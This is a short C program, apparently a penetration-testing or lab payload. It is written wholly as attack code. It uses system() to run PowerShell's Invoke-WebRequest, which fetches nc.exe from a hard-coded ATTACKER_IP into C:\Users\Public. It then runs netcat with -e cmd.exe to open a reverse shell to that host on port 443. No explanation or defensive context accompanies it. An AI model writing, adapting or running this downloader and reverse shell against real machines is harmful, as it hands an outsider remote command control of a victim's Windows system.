#include <stdlib.h>
#include <stdio.h>

#define ATTACKER_IP "192.168.45.152"
#define ATTACKER_PORT "443"

int main(void) {
    char downloadCmd[512];
    char reverseShellCmd[512];

    // Build the download command using PowerShell's Invoke-WebRequest
    snprintf(downloadCmd, sizeof(downloadCmd),
        "if not exist C:\\Users\\Public\\nc.exe powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\"",
        ATTACKER_IP);
    system(downloadCmd);

    // Build the reverse shell command using netcat
    snprintf(reverseShellCmd, sizeof(reverseShellCmd),
        "C:\\Users\\Public\\nc.exe %s %s -e cmd.exe",
        ATTACKER_IP, ATTACKER_PORT);
    system(reverseShellCmd);

    return 0;
}

